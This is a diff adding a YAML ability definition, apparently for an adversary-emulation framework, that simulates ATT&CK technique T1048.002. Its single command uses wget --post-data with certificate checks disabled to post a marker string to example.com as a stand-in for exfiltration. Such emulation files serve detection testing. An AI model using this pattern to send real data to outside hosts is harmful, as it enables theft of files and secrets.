@@ -1,0 +1,18 @@
+---
+- id: 439e725ea58cfc27d764ae4cf56ef979
+  name: Exfiltrate data as text over HTTPS using wget
+  description: 'Exfiltrate data over HTTPS using wget --post-data method
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.002
+    name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted
+      Non-C2 Protocol
+  platforms:
+    linux:
+      sh:
+        command: wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate
+          https://example.com/ --delete-after
+        payloads: []
+        cleanup: ''
